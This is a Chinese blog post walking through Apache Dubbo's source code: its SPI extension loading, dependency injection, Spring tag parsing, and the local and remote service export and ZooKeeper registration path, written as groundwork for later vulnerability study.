                  <a href="/categories/JAVA/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" itemprop="url" rel="index">
                    <span itemprop="name">源码分析</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        最近准备对Dubbo的历史漏洞进行分析，但觉得不懂Dubbo的设计和实现直接去分析漏洞比较困难，所以在分析漏洞前先分析Dubbo的源码及实现，值得一提的是Dubbo的官网也有非常详细的源码分析的过程。</p>
<h3 id="SPI机制及实现"><a href="#SPI机制及实现" class="headerlink" title="SPI机制及实现"></a>SPI机制及实现</h3><p>​        Dubbo的SPI是对JDK自身SPI的扩展实现，增加了IOC和AOP的功能，是Dubbo实现的核心，Dubbo SPI需要的配置文件放在<code>/meta-inf/dubbo</code>目录下，通过键值对的方式配置，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adaptive&#x3D;org.apache.dubbo.common.extension.factory.AdaptiveExtensionFactory</span><br><span class="line">spi&#x3D;org.apache.dubbo.common.extension.factory.SpiExtensionFactory</span><br></pre></td></tr></table></figure>

<p>​        Dubbo的SPI和JDK自身的SPI对比如下，这也是Dubbo没有选择使用JDK自带SPI的原因。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910141629401.png" alt="image-20210910141629401"></p>
<p>​        可以通过<code>@SPI</code>注解将接口声明由Dubbo的SPI机制加载实现类。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910143121791.png" alt="image-20210910143121791"></p>
<h4 id="Dubbo如何实现SPI"><a href="#Dubbo如何实现SPI" class="headerlink" title="Dubbo如何实现SPI?"></a>Dubbo如何实现SPI?</h4><p>​        <code>ExtensionLoader</code>是Dubbo SPI实现的核心类，每个定义的spi的接口都会构建一个ExtensionLoader实例。一般通过<code>ExtensionLoader.getExtensionLoader</code>获取ExtensionLoader实例。</p>
<p>​        <code>getExtensionLoader</code>首先判断是否为接口类型并且由<code>@SPI</code>注解修饰，也就是说只有<code>@SPI</code>修饰的接口才会由Dubbo的SPI机制去寻找实现类。下面会通过<code>EXTENSION_LOADERS</code>寻找是否已经有loader的实例，没有的话会创建一个并添加到<code>EXTENSION_LOADERS</code>中。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910142641943.png" alt="image-20210910142641943"></p>
<p>​        下面分析<code>ExtensionLoader</code>构造方法，如果type类型不为<code>ExtensionFactory</code>则先执行<code>ExtensionLoader.getExtensionLoader(ExtensionFactory.class).getAdaptiveExtension()</code></p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910144520134.png" alt="image-20210910144520134"></p>
<p>​        <code>getAdaptiveExtension</code>首先从缓存中获取实例，没有则通过<code>createAdaptiveExtension</code>创建实例。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910144916264.png" alt="image-20210910144916264"></p>
<p>​        <code>createAdaptiveExtension</code>首先通过<code>getAdaptiveExtensionClass().newInstance()</code>创建实例，再通过<code>injectExtension</code>包装。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910145047509.png" alt="image-20210910145047509"></p>
<p>​        <code>getAdaptiveExtensionClass</code>首先通过<code>getExtensionClasses</code>获取Class,找不到则通过<code>createAdaptiveExtensionClass</code>创建。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910145421185.png" alt="image-20210910145421185"></p>
<p>​        <code>getExtensionClasses</code>首先通过缓存获取Class获取不到则通过<code>loadExtensionClasses</code>方法获取，获取后放到<code>classes</code>Map中。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910145535084.png" alt="image-20210910145535084"></p>
<p>​     <code>loadExtensionClasses</code>首先获取SPI注解的属性值放到缓存中，下面通过<code>loadDirectory</code>从配置文件中加载Class，主要从<code>META-INF/dubbo/</code>、<code>META-INF/services/</code>、<code>META-INF/dubbo/internal</code>几个目录下加载文件。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910150018733.png" alt="image-20210910150018733"></p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910150328371.png" alt="image-20210910150328371"></p>
<p>​            根据dir和type作为文件名加载资源，并通过<code>loadResource</code>加载类的信息并放到<code>extensionClasses</code>中。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910151027677.png" alt="image-20210910151027677">        <code>loadResource</code>中读取文件并解析文件内容获取<code>name</code>和<code>接口实现类的名称</code>，下面通过<code>loadClass</code>加载。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910151554367.png" alt="image-20210910151554367"></p>
<p>​        在<code>loadClass</code>中首先检查<code>clazz</code>是否是type的实现类，再去检测clazz的接口是否有<code>Adaptive</code>注解存在的话放到将类放到<code>cachedAdaptiveClass</code>缓存中，下面再通过是否有参数为<code>clazz</code>的构造方法，有的话将clazz存到<code>cachedWrapperClasses</code>中，下面查看实现类是否有<code>Extension</code>注解，有的话取出这个注解的值并赋值给name。下面获取name的值，可以通过<code>xxx,xxx,xx=xxx.com</code>等形式传入多个name，并通过<code>saveInExtensionClass</code>将<code>name</code>和<code>class</code>的值保存到<code>extensionClasses</code>中。<img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910153042790.png" alt="image-20210910153042790"></p>
<p>​        下面在回到<code>getAdaptiveExtensionClass</code>方法中，首先在缓存中查找，找不到则会通过<code>createAdaptiveExtensionClass</code>创建Class。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910155850737.png" alt="image-20210910155850737"></p>
<p>​        <code>createAdaptiveExtensionClass</code>首先根据<code>type</code>和<code>SPI配置的value</code>的值生成Adaptive包装类并编译为Class，也就是说我们获取的类型不是配置的实现类对象，而是Adaptive包装类对象。<img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910160909268.png" alt="image-20210910160909268"></p>
<p>​        生成代码的逻辑比较复杂，我们就不深入分析了，不过我们可以拿到生成的代码，可以看看生成的代码主要做了什么。首先它是type接口的实现类，如果接口中的方法没有通过<code>Adaptive</code>修饰，则直接抛出异常。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910162020436.png" alt="image-20210910162020436"></p>
<p>​        对于<code>Adaptive</code>注解修饰的方法则会生成实现，首先检查Invoker的url是否为空，再获取协议信息，如果没有配置协议则默认使用<code>dubbo</code>协议，下面获取Protocol的实现类并执行实现类的export方法，其实也就是对export进行了一些包装，在执行export前加了一些验证逻辑。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910162254562.png" alt="image-20210910162254562"></p>
<p>​        <code>refer</code>方法逻辑类似，只是最后调用实现类的<code>refer</code>方法。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910162528606.png" alt="image-20210910162528606"></p>
<p>​        下面我们再回到<code>createAdaptiveExtension</code>方法中，通过<code>getAdaptiveExtensionClass()</code>已经拿到了动态创建的<code>Adaptive</code>类并通过<code>newInstance创建对象</code>，下面通过<code>injectExtension</code>完成依赖注入。<img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910163122043.png" alt="image-20210910163122043"></p>
<h4 id="如何实现IOC"><a href="#如何实现IOC" class="headerlink" title="如何实现IOC?"></a>如何实现IOC?</h4><p><code>injectExtension</code>获取setter方法，并通过<code>objectFactory.getExtension(pt, property);</code>获取需要注入的对象，通过反射调用setter方法完成依赖注入。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910163959267.png" alt="image-20210910163959267"></p>
<p>​        <code>objectFactory</code>可能是下面三种实现类，也就是说除了可以通过<code>Spi</code>获取注入的对象也可以从spring中获取注入对象。而<code>AdaptiveExtensionFactory</code>则会循环调用多个factory获取对象。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910164637510.png" alt="image-20210910164637510"></p>
<p>​        一般objectFactory经过初始化后会封装为<code>AdaptiveExtensionFactory</code>并且包含了<code>spi</code>和<code>spring</code>两个工厂，也就是说默认会通过<code>spi</code>和<code>spring</code>两种方式加载需要注入的对象。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910165458497.png" alt="image-20210910165458497"></p>
<h4 id="为什么可以得到AdaptiveExtentionFactory"><a href="#为什么可以得到AdaptiveExtentionFactory" class="headerlink" title="为什么可以得到AdaptiveExtentionFactory?"></a>为什么可以得到AdaptiveExtentionFactory?</h4><p>​        在容器启动时，会解析<code>&lt;dubbo:service</code>对象，并创建一个serviceBean实例，这个实例是<code>serviceConfig</code>的子类，创建<code>serviceBean</code>实例的过程中也会执行父类的static属性，会执行如下操作。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910173512877.png" alt="image-20210910173512877"></p>
<p>​        跳过一些已经分析过的步骤，在执行<code>ExtensionLoader</code>构造方法时，会判断类型是否为<code>ExtensionFactory</code>类型，如果不是则会执行后面的代码。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910173558737.png" alt="image-20210910173558737"></p>
<p>​        进入<code>getExtensionLoader</code>方法，如果缓存中没有extensionLoader则重新创建一个，也就是说这里还会再调用一次<code>ExtensionLoader</code>的构造方法。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910174331550.png" alt="image-20210910174331550"></p>
<p>​        由于这次<code>type</code>的类型为<code>ExtensionFactory</code>,所以会返回一个<code>ExtensionLoader</code>对象但是此时<code>objectFactory</code>属性为空。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910174450700.png" alt="image-20210910174450700"></p>
<p>​        下面通过<code>getAdaptiveExtesion</code>获取<code>ExtensionFactory</code>的实现类，同样中间的过程不分析了，主要关注在<code>loadExtensionClasses</code>中获取了<code>ExtensionFactory</code>的实现类。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910191335022.png" alt="image-20210910191335022"></p>
<p>​        但是<code>ExtensionFactory</code>中明明配置了三个实现类，为什么加载后变成了两个而没有<code>AdaptiveExtensionFactory</code>。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910191637278.png" alt="image-20210910191637278"></p>
<p>​        我们跟进资源加载部分的代码，可以看到确实读取到了<code>AdaptiveExtensionFactory</code>。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910192020803.png" alt="image-20210910192020803"></p>
<p>​        在<code>loadClass</code>中，由于<code>AdaptiveExtensionFactory</code>实现类由<code>Adaptive</code>注解修饰，因此会该类到缓存<code>cachedAdaptiveClass</code>中并返回，并不会执行后面的<code>saveInExtensionClass</code>方法。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910192607693.png" alt="image-20210910192607693"></p>
<p>​                在执行完<code>getExtensionClasses</code>后，会判断<code>cachedAdaptiveClass</code>中是否有值，有的话则直接返回，所以这里其实通过<code>getAdaptiveExtensionClass</code>返回了<code>AdaptiveExtensionFactory</code>类。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910193304740.png" alt="image-20210910193304740"></p>
<p>​        所以下面是创建了<code>AdaptiveExtensionFactory</code>的实例。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910204329809.png" alt="image-20210910204329809"></p>
<p>​        而在<code>AdaptiveExtensionFactory</code>的构造方法中，通过<code>loader.getSupportedExtensions()</code>获取扩展名，并通过<code>loader.getExtension(&quot;spring&quot;)</code>获取对应的工厂封装到factorties中。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913094202333.png" alt="image-20210913094202333"></p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913094252060.png" alt="image-20210913094252060">    </p>
<p>​        除了动态生成ProtocolAdaptive包装类外，还生成了<code>proxyFactoryAdaptive</code>包装类。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910170319633.png" alt="image-20210910170319633"></p>
<p>​        在Dubbo中主要使用了两种代理方式，即JDK和javassist。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910170540525.png" alt="image-20210910170540525"></p>
<p>​        <code>proxyFactoryAdaptive</code>中主要实现了<code>getProxy</code>和<code>getInvoker</code>方法，如果没有配置代理则默认使用javaassist动态代理。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910170647244.png" alt="image-20210910170647244"></p>
<p>​        <code>getInvoker</code>中则根据传入的参数完成方法的调用。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210910171257814.png" alt="image-20210910171257814"></p>
<h3 id="标签解析过程"><a href="#标签解析过程" class="headerlink" title="标签解析过程"></a>标签解析过程</h3><p>​        上面分析了Dubbo SPI机制的实现过程，下面分析下Dubbo 中配置的标签是如何解析的？</p>
<p>​        <code>NamespaceHandler</code>用来解析Spring遇到的所有这个特定的namespace配置文件中的所有elements，Dubbo 实现了<code>DubboNamespaceHandler</code>作为Dubbo标签中属性的处理器，在它的init方法中，配置了不同element的标签解析器。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913101339434.png" alt="image-20210913101339434"></p>
<p>​        并且Dubbo扩展了<code>BeanDefinitionParser</code>,自定义了<code>DubboBeanDefinitionParser</code>将标签中配置的属性值设置到Bean中，会对bean的属性赋值。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913113221590.png" alt="image-20210913113221590"></p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913113753051.png" alt="image-20210913113753051"></p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913113907181.png" alt="image-20210913113907181"></p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913114042839.png" alt="image-20210913114042839"></p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913114129549.png" alt="image-20210913114129549"></p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913114350703.png" alt="image-20210913114350703"></p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913114650696.png" alt="image-20210913114650696"></p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913114438826.png" alt="image-20210913114438826"></p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913114755892.png" alt="image-20210913114755892"></p>
<h3 id="服务导出过程"><a href="#服务导出过程" class="headerlink" title="服务导出过程"></a>服务导出过程</h3><p>​        通过<code>DubboNamespaceHandler</code>中的配置，可以知道service元素的配置信息会被方法<code>ServiceBean</code>中。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913115400466.png" alt="image-20210913115400466"></p>
<p>​        而<code>ServiceBean</code>中实现了<code>ApplicationListener</code>监听器接口，每当ApplicationContext发布ApplicationEvent时，实现ApplicationListener的Bean将自动被触发。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913115527858.png" alt="image-20210913115527858"></p>
<p>​        所以会触发<code>ServiceBean.onApplicationEvent</code>方法。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913120106343.png" alt="image-20210913120106343"></p>
<p>​        在<code>ServiceBean.onApplicationEvent</code>中通过export方法导出服务。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913120403548.png" alt="image-20210913120403548"></p>
<p>​        在<code>ServiceBean#export</code>中，调用父类<code>ServiceConfig.export</code>，首先判断做了一些检查，检测是否导出，和延时导出后通过<code>doExport</code>完成导出。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913120556258.png" alt="image-20210913120556258"></p>
<p>​        <code>doExport</code>中首先判断是否已经导出过了，再判断是否设置path如果没有则将interfaceName作为path并调用doExportUrls方法。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913134215238.png" alt="image-20210913134215238"></p>
<p>​        <code>doExportUrls</code>首先通过<code>loadRegistries</code>加载注册中心的地址，其次通过<code>buildKey</code>获取接口名，将接口名、实现类实例、接口Class封装到ProviderModel中。再通过<code>initProviderModel</code>将serviceName和providerModel 放到<code>providedServices</code>中。最后通过<code>doExportUrlsFor1Protocol</code>导出服务。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913135243969.png" alt="image-20210913135243969"></p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913140236459.png" alt="image-20210913140236459"></p>
<p>​        <code>doExportUrlsFor1Protocol</code>首先获取name属性值，为空则默认name为dubbo。创建一个存放参数的map，将一些配置的参数放到map中。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913141411753.png" alt="image-20210913141411753"></p>
<p>​        下面通过接口Class构造了接口的包装类，通过包装类获取所有的method，并将methed添加到map中。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913141940752.png" alt="image-20210913141940752"></p>
<p>​    <img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913142046319.png" alt="image-20210913142046319"></p>
<p>​        下面获取host和port，并通过这些信息和map中的信息构造一个<code>org.apache.dubbo.common.URL</code>对象，其中path为interfaceName，map中保存的信息被当作参数。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913142433464.png" alt="image-20210913142433464"></p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913142928529.png" alt="image-20210913142928529"></p>
<p>​        当scope属性没有配置时，则默认先通过<code>exportLocal</code>先发布到本地，再发布到远程。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913143155375.png" alt="image-20210913143155375"></p>
<h4 id="本地导出"><a href="#本地导出" class="headerlink" title="本地导出"></a>本地导出</h4><p>​        本地导出主要在<code>exportLocal</code>中实现，首先判断协议名是否为<code>injvm</code>，如果是则表示已经导出过了，不再进行导出。下面构建本地导出的url，获取Invoker并导出。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913144237104.png" alt="image-20210913144237104"></p>
<p>​        这里的<code>proxyFacory</code>为之前分析SPI机制时动态生成的ProxyFactoryAdaptive类，它的<code>getInvoker</code>方法如下，默认情况下会使用javasist代理。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913144809592.png" alt="image-20210913144809592"></p>
<p>​        <code>JavassistProxyFactory#getInvoker</code>首先创建了实现类的包装类，再创建了<code>AbstractProxyInvoker</code>对象并重写了doInvoke方法</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913150629589.png" alt="image-20210913150629589"></p>
<p>​        而<code>protocol</code>也是在SPI机制动态生成的Adaptor，其export方法如下，</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913151358964.png" alt="image-20210913151358964"></p>
<p>​        而具体调用哪个<code>Protocol</code>的export方法是由<code>(org.apache.dubbo.rpc.Protocol)ExtensionLoader.getExtensionLoader(org.apache.dubbo.rpc.Protocol.class).getExtension(extName)</code>的返回结果决定的，如果我们配置的是是<code>injvm</code>协议，则返回<code>injvmProtocol</code>的包装对象。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913155617492.png" alt="image-20210913155617492"></p>
<p>​        在<code>ProtocolFilterWrapper#export</code>中，首先判断是否是<code>registry</code>协议，如果是则直接导出否则通过<code>buildInvokerChain</code>构建过滤器链后再导出。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913155910479.png" alt="image-20210913155910479"></p>
<p>​        <code>buildInvokerChain</code>构造过滤器链，只有当左右的Filter执行完后才会执行invoker的invoke方法。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913161909275.png" alt="image-20210913161909275"></p>
<p>​        <code>InjvmProtocol#export</code>创建<code>InjvmExporter</code>对象完成本地导出。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913162133815.png" alt="image-20210913162133815"></p>
<h4 id="远程导出"><a href="#远程导出" class="headerlink" title="远程导出"></a>远程导出</h4><p>​            远程导出首先还是获取Invoker，再将Invoker和serviceBean封装到<code>DelegateProviderMetaDataInvoker</code>中，最后调用export方法导出。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913163041659.png" alt="image-20210913163041659"></p>
<h5 id="服务导出"><a href="#服务导出" class="headerlink" title="服务导出"></a><strong>服务导出</strong></h5><p>​        下面分析<code>RegistryProtocol#export</code>,在export方法中，主要通过<code>RegistryProtocol#doLocalExport</code>完成服务导出。首先从Invoker中获取key，其次创建了<code>InvokerDelegate</code>作为Invoker的委托类，最终通过<code>protocol.export完成导出</code>。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913170935219.png" alt="image-20210913170935219"></p>
<p>​        由于我这里使用的是http协议，但HttpProtocol没有export方法，因此会调用父类<code>AbstractProxyProtocol</code>的export方法。在<code>AbstractProxyProtocol#export</code>中，首先判断是否已经导出过，如果没有则通过<code>doExport</code>完成导出。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913171719001.png" alt="image-20210913171719001"></p>
<p>​        在<code>HttpProtocol#doExport</code>中，首先互获取绑定地址，从<code>serverMap</code>缓存中获取server，没有的话通过bind创建server。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913173653552.png" alt="image-20210913173653552"></p>
<p>​        bind的同时创建了<code>InternalHandler</code>,其中handle方法内容为当通过post请求时，会通过<code>HttpInvokerServiceExporter.handleRequest</code>处理请求。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913173903099.png" alt="image-20210913173903099"></p>
<p>​        httpBinder也是Adaptive类，其内容如下,在export方法中，从url中获取server属性并根据server属性得到HttpBinder的实现类，并调用实现类的bind方法。如果没有配置server属性则默认为jetty。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpBinder</span>$<span class="title">Adaptive</span> <span class="keyword">implements</span> <span class="title">org</span>.<span class="title">apache</span>.<span class="title">dubbo</span>.<span class="title">remoting</span>.<span class="title">http</span>.<span class="title">HttpBinder</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> org.apache.dubbo.remoting.http.<span class="function">HttpServer <span class="title">bind</span><span class="params">(org.apache.dubbo.common.URL arg0, org.apache.dubbo.remoting.http.HttpHandler arg1)</span>  </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (arg0 == <span class="keyword">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"url == null"</span>);</span><br><span class="line">        org.apache.dubbo.common.URL url = arg0;</span><br><span class="line">        String extName = url.getParameter(<span class="string">"server"</span>, <span class="string">"jetty"</span>);</span><br><span class="line">        <span class="keyword">if</span>(extName == <span class="keyword">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Failed to get extension (org.apache.dubbo.remoting.http.HttpBinder) name from url ("</span> + url.toString() + <span class="string">") use keys([server])"</span>);</span><br><span class="line">        org.apache.dubbo.remoting.http.HttpBinder extension = (org.apache.dubbo.remoting.http.HttpBinder)ExtensionLoader.getExtensionLoader(org.apache.dubbo.remoting.http.HttpBinder<span class="class">.<span class="keyword">class</span>).<span class="title">getExtension</span>(<span class="title">extName</span>)</span>;</span><br><span class="line">        <span class="keyword">return</span> extension.bind(arg0, arg1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        由于我们配置的server为tomcat因此会调用<code>TomcatHttpBinder#bind</code>方法，创建一个<code>TomcatHttpServer</code>.</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913174901860.png" alt="image-20210913174901860"></p>
<p>​        下面构造Tomcat服务需要的一些参数，并且动态创建一个servlet，启动tomcat服务器。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913175327784.png" alt="image-20210913175327784"></p>
<p>​        启动server后，获取path，并将path作为key,通过<code>createExporter</code>创建的<code>HttpInvokerServiceExporter</code>作为值put到skeletonMap中。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913180242019.png" alt="image-20210913180242019"></p>
<p>​        给<code>HttpInvokerServiceExporter</code>添加接口信息和实现类.</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914203023130.png" alt="image-20210914203023130"></p>
<p>​        最后创建一个Runnable对象并返回。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913180820871.png" alt="image-20210913180820871"></p>
<p>​        回到<code>AbstractProxyProtocol#export</code>中，得到runnable对象后，创建<code>AbstractExporter</code>对象并返回，将exporter放到缓存中后返回。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913180958894.png" alt="image-20210913180958894"></p>
<h5 id="服务注册"><a href="#服务注册" class="headerlink" title="服务注册"></a><strong>服务注册</strong></h5><p>​            首先获取registry实例，并且获取providerUrl，通过<code>registerProvider</code>将provider注册到<code>providerInvokers</code>中。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913183049914.png" alt="image-20210913183049914"></p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913183319343.png" alt="image-20210913183319343"></p>
<p>​            下面调用register方法进行服务注册。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913202357260.png" alt="image-20210913202357260"></p>
<p>​        register方法中主要通过doRegister完成注册。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913202655478.png" alt="image-20210913202655478"></p>
<p>​        由于我们使用的是zookeeper作为注册中心，所以会通过<code>ZookeeperRegistry#doRegister</code>完成服务注册。</p>
